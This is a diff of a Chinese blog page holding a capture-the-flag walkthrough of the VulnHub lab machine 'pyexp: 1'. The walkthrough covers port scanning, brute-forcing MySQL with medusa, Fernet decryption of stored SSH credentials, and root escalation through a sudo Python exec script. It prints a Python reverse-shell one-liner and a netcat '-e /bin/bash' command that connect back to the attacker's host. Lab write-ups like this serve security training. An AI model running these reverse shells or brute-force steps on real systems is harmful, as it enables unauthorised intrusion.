@@ -13,17 +13,6 @@
 <meta property="og:site_name" content="HDFZZF&#39;s BLOG">
 <meta property="og:description" content="该靶机难度不是很高，但是很有特点。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427225554.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427225159.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427231946.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427232053.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427232347.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427232522.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427233417.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427233859.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427234055.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427234407.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427234612.png">
 <meta property="article:published_time" content="2022-04-26T16:00:00.000Z">
 <meta property="article:modified_time" content="2022-04-27T15:54:44.589Z">
 <meta property="article:author" content="hdfzzf">
@@ -33,7 +22,6 @@
 <meta property="article:tag" content="sudo提权">
 <meta property="article:tag" content="python">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427225554.png">
     
     
       
@@ -116,7 +104,8 @@
     </span>
     <br/>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. MySQL密码爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. 信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.5.</span> <span class="toc-text">2.5. 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1.
+主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. MySQL密码爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. 信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.5.</span> <span class="toc-text">2.5. 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -170,7 +159,8 @@
 <h1 id="靶机信息">1. 靶机信息</h1>
 <p>靶机地址：</p>
 <ul>
-<li><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/pyexp-1,534/">pyexp: 1 ~ VulnHub</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/pyexp-1,534/">pyexp: 1 ~
+VulnHub</a></li>
 </ul>
 <p>注意：</p>
 <ul>
@@ -201,9 +191,11 @@
 <h1 id="渗透">2. 渗透</h1>
 <p>kali：192.168.137.10</p>
 <p>靶机: 192.168.137.11</p>
-<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
+<h2 id="主机发现端口扫描端口服务发现">2.1.
+主机发现、端口扫描、端口服务发现</h2>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 192.168.137.11</span><br><span class="line">sudo nmap -p1337,3306 -A 192.168.137.11</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427225554.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427225554.png" /></p>
 <p>信息：</p>
 <ul>
 <li>1337端口的服务为ssh；</li>
@@ -212,22 +204,28 @@
 <p>很奇怪的是该靶机居然没有http服务！！！</p>
 <h2 id="mysql密码爆破">2.2. MySQL密码爆破</h2>
 <p>可以先进行ssh密码爆破，因此此时不知道靶机上有哪些用户，可以先用root跑</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427225159.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427225159.png" /></p>
 <p>时间非常的长，并且最终也跑不出来。</p>
-<p>MySQL也有一个默认的用户root，但是此root并不是操作系统的root。输入如下命令进行爆破： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -h 192.168.137.11 -M mysql -u root -P rockyou.txt</span><br></pre></td></tr></table></figure></p>
+<p>MySQL也有一个默认的用户root，但是此root并不是操作系统的root。输入如下命令进行爆破：
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -h 192.168.137.11 -M mysql -u root -P rockyou.txt</span><br></pre></td></tr></table></figure></p>
 <p>（hydra出了点问题，使用medusa进行爆破也是一样的）</p>
 <p>最终得到结果：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427231946.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427231946.png" /></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line">username: root</span><br><span class="line">password: prettywoman</span><br></pre></td></tr></table></figure>
 <p>远程登录数据库： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 192.168.137.11 -u root -p</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427232053.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427232053.png" /></p>
 <h2 id="信息收集">2.3. 信息收集</h2>
 <p>总所周知，MySQL是可以提权的，但是这里有一个问题就是，当前执行MySQL的用户是kali的用户，并不是靶机的用户，因此就算利用MySQL命令执行提权得到的也是kali的用户的权限。可以利用下述命令执行系统查看id就可以知道。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\! id &lt;==&gt; system id &lt;==&gt; select do_system(&#x27;id&#x27;) # 靶机上无法运行第三个</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427232347.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427232347.png" /></p>
 <p>还可以读取MySQL的默认配置以及系统文件的内容，默认配置文件没有任何有用的信息，而/etc/passwd里面反而有信息</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 查看是否能够进行文件的读取和写入操作</span><br><span class="line">show variables like &#x27;secure_file_priv&#x27;;</span><br><span class="line"></span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br><span class="line"></span><br><span class="line">可以！</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427232522.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427232522.png" /></p>
 <p>可以发现除了root之外，还有一个lucy用户。其实这里也可以再次进行ssh爆破，但是还是没结果。</p>
 <p>其实也可以查看一下/home/lucy/.ssh/id_rsa，如果存在的话，就可以利用密钥登陆ssh，可惜不存在。</p>
 <p>最终查看数据库发现有四个数据库 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(<span class="keyword">none</span>)]<span class="operator">&gt;</span> <span class="keyword">show</span> databases;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> Database           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> data               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> information_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> performance_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure></p>
@@ -253,35 +251,46 @@
 <p>没有任何其他的信息了，那么信息应该就隐藏在上述表格中，因为cred和key看起来很像是密码和密钥。</p>
 <h2 id="get-shell">2.4. get shell</h2>
 <p>这里其实卡了非常久，后来百度知道了fernet其实是python中用来加解密的一个库。</p>
-<p>官方文档：<a target="_blank" rel="noopener" href="https://cryptography.io/en/latest/fernet/">Fernet (symmetric encryption) — Cryptography 38.0.0.dev1 documentation</a></p>
+<p>官方文档：<a target="_blank" rel="noopener" href="https://cryptography.io/en/latest/fernet/">Fernet
+(symmetric encryption) — Cryptography 38.0.0.dev1 documentation</a></p>
 <p>可以尝试官方给的加密代码生成密钥和加密，会发现密钥和加密的字符串和keyy和cred非常类似。因此确定是利用fernet进行加密的。</p>
 <p>有两种解密方法：</p>
 <ol type="1">
-<li>在线网站：<a target="_blank" rel="noopener" href="https://asecuritysite.com/encryption/ferdecode">Fernet (Decode)</a></li>
+<li>在线网站：<a
+target="_blank" rel="noopener" href="https://asecuritysite.com/encryption/ferdecode">Fernet
+(Decode)</a></li>
 <li>编写python代码</li>
 </ol>
 <p>前者比较简单：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427233417.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427233417.png" /></p>
 <p>后者演示：(如果利用官方的解密代码查看过生成的key和token，就会发现它们是byte型的，所以前面加b)</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3</span><br><span class="line">from cryptography.fernet import Fernet</span><br><span class="line">key = b<span class="string">&#x27;UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=&#x27;</span></span><br><span class="line">token = b<span class="string">&#x27;gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=&#x27;</span></span><br><span class="line">f.decrypt(token)</span><br></pre></td></tr></table></figure>
 <p>得到： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;lucy:wJ9`&quot;Lemdv9[FEw-&#x27;</span><br></pre></td></tr></table></figure></p>
-<p>根据/etc/passwd的内容，猜测这是ssh登录的账号和密码： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: lucy</span><br><span class="line">password: wJ9`&quot;Lemdv9[FEw- # 这密码能爆破出来就有鬼了</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427233859.png" /></p>
+<p>根据/etc/passwd的内容，猜测这是ssh登录的账号和密码：
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: lucy</span><br><span class="line">password: wJ9`&quot;Lemdv9[FEw- # 这密码能爆破出来就有鬼了</span><br></pre></td></tr></table></figure></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427233859.png" /></p>
 <p>切记要指定端口！！！</p>
 <h2 id="权限提升">2.5. 权限提升</h2>
 <p>在信息收集的时候发现： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427234055.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427234055.png" /></p>
 <p>查看一下该文件的权限配置 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lucy@pyexp:~$ ls -l /opt/exp.py</span><br><span class="line">-rw-r--r-- 1 root root 49 Aug 10  2020 /opt/exp.py</span><br></pre></td></tr></table></figure></p>
 <p>读取文件内容： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lucy@pyexp:~$ cat /opt/exp.py</span><br><span class="line">uinput = raw_input(<span class="string">&#x27;how are you?&#x27;</span>)</span><br><span class="line"><span class="built_in">exec</span>(uinput)</span><br></pre></td></tr></table></figure></p>
 <p>心里狂喜，exec是python的函数，可以执行python代码。并且该文件的属主为root，如果用该文件得到shell，那就成功提权到root。</p>
-<p>输入如下命令直接提权：(提前用which确定一下是否有bash) <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import pty; pty.spawn(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427234407.png" /></p>
+<p>输入如下命令直接提权：(提前用which确定一下是否有bash)
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import pty; pty.spawn(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427234407.png" /></p>
 <p>也可以利用之前python反弹shell的代码：(kali先监听) <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.137.10&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427234612.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427234612.png" /></p>
 <p>还可以这么写反弹shell，效果和上面的一样。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;nc 192.168.137.10 4444 -e /bin/bash&#x27;)</span><br></pre></td></tr></table></figure></p>
 <p>读取两个flag： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 1. /home/lucy/user.txt</span><br><span class="line">8ca196f62e91847f07f8043b499bd9be</span><br><span class="line"></span><br><span class="line">// 2. /root/root.txt</span><br><span class="line">a7a7e80ff4920ff06f049012700c99a8</span><br></pre></td></tr></table></figure></p>
 <h1 id="总结">3. 总结</h1>
-<p>该靶机难度并不算高，非常有特点，以往的靶机都是通过web进行get shell，而这台靶机通过数据库信息来get shell。</p>
+<p>该靶机难度并不算高，非常有特点，以往的靶机都是通过web进行get
+shell，而这台靶机通过数据库信息来get shell。</p>
 <p>主要的难点在能否知道fernet是python的加解密的库。</p>
 
   </div>
@@ -316,7 +325,8 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. MySQL密码爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. 信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.5.</span> <span class="toc-text">2.5. 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1.
+主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. MySQL密码爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. 信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.5.</span> <span class="toc-text">2.5. 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
@@ -351,7 +361,7 @@
     Copyright &copy;
     
     
-    2021-2022
+    2021-2023
     hdfzzf
   </div>
   <div class="footer-right">
